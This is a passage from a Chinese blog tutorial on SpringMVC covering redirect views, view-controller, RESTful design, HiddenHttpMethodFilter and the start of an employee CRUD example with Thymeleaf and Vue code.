class="params">()</span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="string">&quot;forward:/testHello&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://imagesblog.oss-cn-hangzhou.aliyuncs.com/post-blog/ssm/31.png" alt="31"></p><h2 id="6-3、重定向视图"><a href="#6-3、重定向视图" class="headerlink" title="6.3、重定向视图"></a>6.3、重定向视图</h2><p>SpringMVC中默认的重定向视图是RedirectView</p><p>当控制器方法中所设置的视图名称以”redirect:”为前缀时，创建RedirectView视图，此时的视图名称不</p><p>会被SpringMVC配置文件中所配置的视图解析器解析，而是会将前缀”redirect:”去掉，剩余部分作为最终路径通过重定向的方式实现跳转</p><p>例如”redirect:&#x2F;“，”redirect:&#x2F;employee”</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@RequestMapping(&quot;/testRedirect&quot;)</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">testRedirect</span><span class="params">()</span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="string">&quot;redirect:/testHello&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://imagesblog.oss-cn-hangzhou.aliyuncs.com/post-blog/ssm/32.png" alt="32"></p><blockquote><p>注：</p><p>重定向视图在解析时，会先将redirect:前缀去掉，然后会判断剩余部分是否以&#x2F;开头，若是则会自</p><p>动拼接上下文路径</p></blockquote><h2 id="6-4、视图控制器view-controller"><a href="#6-4、视图控制器view-controller" class="headerlink" title="6.4、视图控制器view-controller"></a>6.4、视图控制器view-controller</h2><p>当控制器方法中，仅仅用来实现页面跳转，即只需要设置视图名称时，可以将处理器方法使用view</p><p>controller标签进行表示</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">    path：设置处理的请求地址</span></span><br><span class="line"><span class="comment">    view-name：设置请求地址所对应的视图名称</span></span><br><span class="line"><span class="comment">--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">mvc:view-controller</span> <span class="attr">path</span>=<span class="string">&quot;/testView&quot;</span> <span class="attr">view-name</span>=<span class="string">&quot;success&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">mvc:view-controller</span>&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>注：</p><p>当SpringMVC中设置任何一个view-controller时，其他控制器中的请求映射将全部失效，此时需</p><p>要在SpringMVC的核心配置文件中设置开启mvc注解驱动的标签：</p><p>&lt;mvc:annotation-driven &#x2F;&gt;</p></blockquote><h1 id="7、RESTful"><a href="#7、RESTful" class="headerlink" title="7、RESTful"></a>7、RESTful</h1><h2 id="7-1、RESTful简介"><a href="#7-1、RESTful简介" class="headerlink" title="7.1、RESTful简介"></a>7.1、RESTful简介</h2><p>REST：<strong>Re</strong>presentational <strong>S</strong>tate <strong>T</strong>ransfer，表现层资源状态转移。</p><h3 id="①资源"><a href="#①资源" class="headerlink" title="①资源"></a>①资源</h3><p>资源是一种看待服务器的方式，即，将服务器看作是由很多离散的资源组成。每个资源是服务器上一个可命名的抽象概念。因为资源是一个抽象的概念，所以它不仅仅能代表服务器文件系统中的一个文件、数据库中的一张表等等具体的东西，可以将资源设计的要多抽象有多抽象，只要想象力允许而且客户端应用开发者能够理解。与面向对象设计类似，资源是以名词为核心来组织的，首先关注的是名词。一个资源可以由一个或多个URI来标识。URI既是资源的名称，也是资源在Web上的地址。对某个资源感兴趣的客户端应用，可以通过资源的URI与其进行交互。</p><h3 id="②资源的表述"><a href="#②资源的表述" class="headerlink" title="②资源的表述"></a>②资源的表述</h3><p>资源的表述是一段对于资源在某个特定时刻的状态的描述。可以在客户端-服务器端之间转移（交</p><p>换）。资源的表述可以有多种格式，例如HTML&#x2F;XML&#x2F;JSON&#x2F;纯文本&#x2F;图片&#x2F;视频&#x2F;音频等等。资源的表述格式可以通过协商机制来确定。请求-响应方向的表述通常使用不同的格式。</p><h3 id="③状态转移"><a href="#③状态转移" class="headerlink" title="③状态转移"></a>③状态转移</h3><p>状态转移说的是：在客户端和服务器端之间转移（transfer）代表资源状态的表述。通过转移和操作资</p><p>源的表述，来间接实现操作资源的目的。</p><h2 id="7-2、RESTful的实现"><a href="#7-2、RESTful的实现" class="headerlink" title="7.2、RESTful的实现"></a>7.2、RESTful的实现</h2><p>具体说，就是 HTTP 协议里面，四个表示操作方式的动词：GET、POST、PUT、DELETE。</p><p>它们分别对应四种基本操作：GET 用来获取资源，POST 用来新建资源，PUT 用来更新资源，DELETE</p><p>用来删除资源。</p><p>REST 风格提倡 URL 地址使用统一的风格设计，从前到后各个单词使用斜杠分开，不使用问号键值对方式携带请求参数，而是将要发送给服务器的数据作为 URL 地址的一部分，以保证整体风格的一致性。</p><table><thead><tr><th><strong>操作</strong></th><th><strong>传统方式</strong></th><th><strong>REST****风格</strong></th></tr></thead><tbody><tr><td>查询操作</td><td>getUserById?id&#x3D;1</td><td>user&#x2F;1–&gt;get请求方式</td></tr><tr><td>保存操作</td><td>saveUser</td><td>user–&gt;post请求方式</td></tr><tr><td>删除操作</td><td>deleteUser?id&#x3D;1</td><td>user&#x2F;1–&gt;delete请求方式</td></tr><tr><td>更新操作</td><td>updateUser</td><td>user–&gt;put请求方式</td></tr></tbody></table><h2 id="7-3、HiddenHttpMethodFilter"><a href="#7-3、HiddenHttpMethodFilter" class="headerlink" title="7.3、HiddenHttpMethodFilter"></a>7.3、HiddenHttpMethodFilter</h2><p>由于浏览器只支持发送get和post方式的请求，那么该如何发送put和delete请求呢？</p><p>SpringMVC 提供了 <strong>HiddenHttpMethodFilter</strong> 帮助我们<strong>将</strong> <strong>POST</strong> <strong>请求转换为</strong> <strong>DELETE</strong> <strong>或</strong> <strong>PUT</strong> <strong>请求</strong></p><p><strong>HiddenHttpMethodFilter</strong> 处理put和delete请求的条件：</p><p>a&gt;当前请求的请求方式必须为post</p><p>b&gt;当前请求必须传输请求参数_method</p><p>满足以上条件，<strong>HiddenHttpMethodFilter</strong> 过滤器就会将当前请求的请求方式转换为请求参数</p><p>_method的值，因此请求参数_method的值才是最终的请求方式</p><p>在web.xml中注册<strong>HiddenHttpMethodFilter</strong></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">filter</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>HiddenHttpMethodFilter<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-class</span>&gt;</span>org.springframework.web.filter.HiddenHttpMethodFilter&lt;/filterclass&gt;</span><br><span class="line"><span class="tag">&lt;/<span class="name">filter</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">filter-mapping</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>HiddenHttpMethodFilter<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/*<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">filter-mapping</span>&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>注：</p><p>目前为止，SpringMVC中提供了两个过滤器：CharacterEncodingFilter和</p><p>HiddenHttpMethodFilter</p><p>在web.xml中注册时，必须先注册CharacterEncodingFilter，再注册HiddenHttpMethodFilter</p><p>原因：</p><ul><li>在 CharacterEncodingFilter 中通过 request.setCharacterEncoding(encoding) 方法设置字</li></ul><p>符集的</p><ul><li><p>request.setCharacterEncoding(encoding) 方法要求前面不能有任何获取请求参数的操作</p></li><li><p>而 HiddenHttpMethodFilter 恰恰有一个获取请求方式的操作：</p></li><li><p>&#96;&#96;&#96;java<br>String paramValue &#x3D; request.getParameter(this.methodParam);</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"># 8、RESTful案例</span><br><span class="line"></span><br><span class="line">## 8.1、准备工作</span><br><span class="line"></span><br><span class="line">和传统 CRUD 一样，实现对员工信息的增删改查。</span><br><span class="line"></span><br><span class="line">- 搭建环境</span><br><span class="line">- 准备实体类</span><br><span class="line"></span><br><span class="line">```java</span><br><span class="line">package com.atguigu.mvc.bean;</span><br><span class="line">public class Employee &#123;</span><br><span class="line">   private Integer id;</span><br><span class="line">   private String lastName;</span><br><span class="line">   private String email;</span><br><span class="line">   //1 male, 0 female</span><br><span class="line">   private Integer gender;</span><br><span class="line">   public Integer getId() &#123;</span><br><span class="line">       return id;</span><br><span class="line">   &#125;</span><br><span class="line">   public void setId(Integer id) &#123;</span><br><span class="line">       this.id = id;</span><br><span class="line">   &#125;</span><br><span class="line">   public String getLastName() &#123;</span><br><span class="line">       return lastName;</span><br><span class="line">   &#125;</span><br><span class="line">   public void setLastName(String lastName) &#123;</span><br><span class="line">       this.lastName = lastName;</span><br><span class="line">   &#125;</span><br><span class="line">   public String getEmail() &#123;</span><br><span class="line">       return email;</span><br><span class="line">   &#125;</span><br><span class="line">   public void setEmail(String email) &#123;</span><br><span class="line">       this.email = email;</span><br><span class="line">   &#125;</span><br><span class="line">   public Integer getGender() &#123;</span><br><span class="line">       return gender;</span><br><span class="line">   &#125;</span><br><span class="line">   public void setGender(Integer gender) &#123;</span><br><span class="line">       this.gender = gender;</span><br><span class="line">   &#125;</span><br><span class="line">   public Employee(Integer id, String lastName, String email, Integergender) &#123;</span><br><span class="line">       super();</span><br><span class="line">       this.id = id;</span><br><span class="line">       this.lastName = lastName;</span><br><span class="line">       this.email = email;</span><br><span class="line">       this.gender = gender;</span><br><span class="line">   &#125;</span><br><span class="line">   public Employee() &#123;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul></blockquote><ul><li>准备dao模拟数据</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.atguigu.mvc.dao;</span><br><span class="line"><span class="keyword">import</span> java.util.Collection;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"><span class="keyword">import</span> com.atguigu.mvc.bean.Employee;</span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Repository;</span><br><span class="line"><span class="meta">@Repository</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">EmployeeDao</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> Map&lt;Integer, Employee&gt; employees = <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">static</span>&#123;</span><br><span class="line">        employees = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;Integer, Employee&gt;();</span><br><span class="line">        employees.put(<span class="number">1001</span>, <span class="keyword">new</span> <span class="title class_">Employee</span>(<span class="number">1001</span>, <span class="string">&quot;E-AA&quot;</span>, <span class="string">&quot;aa@163.com&quot;</span>, <span class="number">1</span>));</span><br><span class="line">        employees.put(<span class="number">1002</span>, <span class="keyword">new</span> <span class="title class_">Employee</span>(<span class="number">1002</span>, <span class="string">&quot;E-BB&quot;</span>, <span class="string">&quot;bb@163.com&quot;</span>, <span class="number">1</span>));</span><br><span class="line">        employees.put(<span class="number">1003</span>, <span class="keyword">new</span> <span class="title class_">Employee</span>(<span class="number">1003</span>, <span class="string">&quot;E-CC&quot;</span>, <span class="string">&quot;cc@163.com&quot;</span>, <span class="number">0</span>));</span><br><span class="line">        employees.put(<span class="number">1004</span>, <span class="keyword">new</span> <span class="title class_">Employee</span>(<span class="number">1004</span>, <span class="string">&quot;E-DD&quot;</span>, <span class="string">&quot;dd@163.com&quot;</span>, <span class="number">0</span>));</span><br><span class="line">        employees.put(<span class="number">1005</span>, <span class="keyword">new</span> <span class="title class_">Employee</span>(<span class="number">1005</span>, <span class="string">&quot;E-EE&quot;</span>, <span class="string">&quot;ee@163.com&quot;</span>, <span class="number">1</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">Integer</span> <span class="variable">initId</span> <span class="operator">=</span> <span class="number">1006</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">save</span><span class="params">(Employee employee)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(employee.getId() == <span class="literal">null</span>)&#123;</span><br><span class="line">            employee.setId(initId++);</span><br><span class="line">        &#125;</span><br><span class="line">        employees.put(employee.getId(), employee);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> Collection&lt;Employee&gt; <span class="title function_">getAll</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> employees.values();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> Employee <span class="title function_">get</span><span class="params">(Integer id)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> employees.get(id);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">delete</span><span class="params">(Integer id)</span>&#123;</span><br><span class="line">        employees.remove(id);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="8-2、功能清单"><a href="#8-2、功能清单" class="headerlink" title="8.2、功能清单"></a>8.2、功能清单</h2><table><thead><tr><th><strong>功能</strong></th><th><strong>URL</strong> <strong>地址</strong></th><th><strong>请求方式</strong></th></tr></thead><tbody><tr><td>访问首页√</td><td>&#x2F;</td><td>GET</td></tr><tr><td>查询全部数据√</td><td>&#x2F;employee</td><td>GET</td></tr><tr><td>删除√</td><td>&#x2F;employee&#x2F;2</td><td>DELETE</td></tr><tr><td>跳转到添加数据页面√</td><td>&#x2F;toAdd</td><td>GET</td></tr><tr><td>执行保存√</td><td>&#x2F;employee</td><td>POST</td></tr><tr><td>跳转到更新数据页面√</td><td>&#x2F;employee&#x2F;2</td><td>GET</td></tr><tr><td>执行更新√</td><td>&#x2F;employee</td><td>PUT</td></tr></tbody></table><h2 id="8-3、具体功能：访问首页"><a href="#8-3、具体功能：访问首页" class="headerlink" title="8.3、具体功能：访问首页"></a>8.3、具体功能：访问首页</h2><h3 id="①配置view-controller"><a href="#①配置view-controller" class="headerlink" title="①配置view-controller"></a>①配置view-controller</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">mvc:view-controller</span> <span class="attr">path</span>=<span class="string">&quot;/&quot;</span> <span class="attr">view-name</span>=<span class="string">&quot;index&quot;</span>/&gt;</span></span><br></pre></td></tr></table></figure><h3 id="②创建页面"><a href="#②创建页面" class="headerlink" title="②创建页面"></a>②创建页面</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span> <span class="attr">xmlns:th</span>=<span class="string">&quot;http://www.thymeleaf.org&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span> &gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">title</span>&gt;</span>Title<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">h1</span>&gt;</span>首页<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">a</span> <span class="attr">th:href</span>=<span class="string">&quot;@&#123;/employee&#125;&quot;</span>&gt;</span>访问员工信息<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="8-4、具体功能：查询所有员工数据"><a href="#8-4、具体功能：查询所有员工数据" class="headerlink" title="8.4、具体功能：查询所有员工数据"></a>8.4、具体功能：查询所有员工数据</h2><h3 id="①控制器方法"><a href="#①控制器方法" class="headerlink" title="①控制器方法"></a>①控制器方法</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@RequestMapping(value = &quot;/employee&quot;, method = RequestMethod.GET)</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">getEmployeeList</span><span class="params">(Model model)</span>&#123;</span><br><span class="line">    Collection&lt;Employee&gt; employeeList = employeeDao.getAll();</span><br><span class="line">    model.addAttribute(<span class="string">&quot;employeeList&quot;</span>, employeeList);</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;employee_list&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="②创建employee-list-html"><a href="#②创建employee-list-html" class="headerlink" title="②创建employee_list.html"></a>②创建employee_list.html</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span> <span class="attr">xmlns:th</span>=<span class="string">&quot;http://www.thymeleaf.org&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">title</span>&gt;</span>Employee Info<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span> <span class="attr">th:src</span>=<span class="string">&quot;@&#123;/static/js/vue.js&#125;&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">table</span> <span class="attr">border</span>=<span class="string">&quot;1&quot;</span> <span class="attr">cellpadding</span>=<span class="string">&quot;0&quot;</span> <span class="attr">cellspacing</span>=<span class="string">&quot;0&quot;</span> <span class="attr">style</span>=<span class="string">&quot;text-align:center;&quot;</span> <span class="attr">id</span>=<span class="string">&quot;dataTable&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">th</span> <span class="attr">colspan</span>=<span class="string">&quot;5&quot;</span>&gt;</span>Employee Info<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">th</span>&gt;</span>id<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">th</span>&gt;</span>lastName<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">th</span>&gt;</span>email<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">th</span>&gt;</span>gender<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">th</span>&gt;</span>options(<span class="tag">&lt;<span class="name">a</span> <span class="attr">th:href</span>=<span class="string">&quot;@&#123;/toAdd&#125;&quot;</span>&gt;</span>add<span class="tag">&lt;/<span class="name">a</span>&gt;</span>)<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">tr</span> <span class="attr">th:each</span>=<span class="string">&quot;employee : $&#123;employeeList&#125;&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">td</span> <span class="attr">th:text</span>=<span class="string">&quot;$&#123;employee.id&#125;&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">td</span> <span class="attr">th:text</span>=<span class="string">&quot;$&#123;employee.lastName&#125;&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">td</span> <span class="attr">th:text</span>=<span class="string">&quot;$&#123;employee.email&#125;&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">td</span> <span class="attr">th:text</span>=<span class="string">&quot;$&#123;employee.gender&#125;&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">td</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">a</span> <span class="attr">class</span>=<span class="string">&quot;deleteA&quot;</span> @<span class="attr">click</span>=<span class="string">&quot;deleteEmployee&quot;</span></span></span><br><span class="line"><span class="tag">                       <span class="attr">th:href</span>=<span class="string">&quot;@&#123;&#x27;/employee/&#x27;+$&#123;employee.id&#125;&#125;&quot;</span>&gt;</span>delete<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">a</span> <span class="attr">th:href</span>=<span class="string">&quot;@&#123;&#x27;/employee/&#x27;+$&#123;employee.id&#125;&#125;&quot;</span>&gt;</span>update<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">table</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="8-5、具体功能：删除"><a href="#8-5、具体功能：删除" class="headerlink" title="8.5、具体功能：删除"></a>8.5、具体功能：删除</h2><h3 id="①创建处理delete请求方式的表单"><a href="#①创建处理delete请求方式的表单" class="headerlink" title="①创建处理delete请求方式的表单"></a>①创建处理delete请求方式的表单</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 作用：通过超链接控制表单的提交，将post请求转换为delete请求 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">id</span>=<span class="string">&quot;delete_form&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- HiddenHttpMethodFilter要求：必须传输_method请求参数，并且值为最终的请求方式 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;_method&quot;</span> <span class="attr">value</span>=<span class="string">&quot;delete&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure><p>引入vue.js</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span> <span class="attr">th:src</span>=<span class="string">&quot;@&#123;/static/js/vue.js&#125;&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>删除超链接</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">class</span>=<span class="string">&quot;deleteA&quot;</span> @<span class="attr">click</span>=<span class="string">&quot;deleteEmployee&quot;</span><span class="attr">th:href</span>=<span class="string">&quot;@&#123;&#x27;/employee/&#x27;+$&#123;employee.id&#125;&#125;&quot;</span>&gt;</span>delete<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure><p>通过vue处理点击事件</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">var</span> vue = <span class="keyword">new</span> <span class="title class_">Vue</span>(&#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">el</span>:<span class="string">&quot;#dataTable&quot;</span>,</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">methods</span>:&#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="comment">//event表示当前事件</span></span></span><br><span class="line"><span class="language-javascript">            <span class="attr">deleteEmployee</span>:<span class="keyword">function</span> (<span class="params">event</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">                <span class="comment">//通过id获取表单标签</span></span></span><br><span class="line"><span class="language-javascript">                <span 